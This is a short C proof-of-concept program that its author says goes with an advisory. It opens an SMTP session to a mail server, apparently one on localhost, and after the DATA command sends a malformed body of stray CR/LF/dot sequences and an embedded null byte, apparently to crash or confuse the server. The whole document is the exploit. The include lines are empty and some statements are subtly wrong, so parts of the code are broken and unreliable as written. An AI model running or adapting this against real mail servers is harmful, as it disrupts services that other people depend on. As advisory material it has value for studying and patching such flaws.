/* this is the code that comes with my
 * advisory #1 to illustrate this...
 * eldre8 at afturgurluk (double dot minus one) org
 */

#include
#include
#include
#include
#include
#include
#include
#include

#define MX "localhost"
#define EHLO "EHLO mx\r\n"
#define MAIL "MAIL FROM: root@localhost\r\n"
#define RCPT "RCPT TO: root@localhost\r\n"
#define DATA "DATA\r\n"
#define QUIT "QUIT\r\n"

#define PORT 25

int sock;
char buffer[255];

void SigCatch() {
    fprintf(stderr, "\b\bbye!\n");
    close(sock);
    exit(0);
}

int main() {
    /* I was too lame to implement the command line... :) */
    int i;
    struct sockaddr_in sout;
    struct hostent *hp;

    signal(SIGINT, SigCatch);

    hp=gethostbyname(MX);
    sock=socket(AF_INET, SOCK_STREAM, 0);
    if (sock<0) {
        perror("sock");
        return -1;
    }

    sout.sin_family=AF_INET;
    sout.sin_port=htons(PORT);
    memcpy(&(sout.sin_addr), *(hp->h_addr_list), sizeof(struct in_addr));
    if (connect(sock, &sout, sizeof(sout))<0) {
        perror("connect");
        return -1;
    }
    recv(sock, buffer, 255, 0); /* receive the banner... */
    send(sock, EHLO, sizeof(EHLO), 0);
    recv(sock, buffer, 255, 0); /* receive the welcome message... */
    send(sock, MAIL, sizeof(MAIL), 0);
    recv(sock, buffer, 255, 0); /* receive the acknowledgement to mail from. */
    send(sock, RCPT, sizeof(RCPT), 0);
    recv(sock, buffer, 255, 0); /* idem, but for the rcpt to... */
    send(sock, DATA, sizeof(DATA), 0);
    recv(sock, buffer, 255, 0);
    i=sprintf(buffer, "b4d maIl 1n 4KT1oN!\n\x0a\x0d\x2e\x0d\x20\x0a\x0a\nblabla...\x0a\x20");
    *(buffer+i)="\x0";
    sprintf(buffer+i+1, "\n.\n");
    send(sock, buffer, i+1+3, 0); /* send the dumb thing ... */
    recv(sock, buffer, 255, 0);
    send(sock, QUIT, sizeof(QUIT), 0);
    recv(sock, buffer, 255, 0);
    close(sock);

    return 0;
}

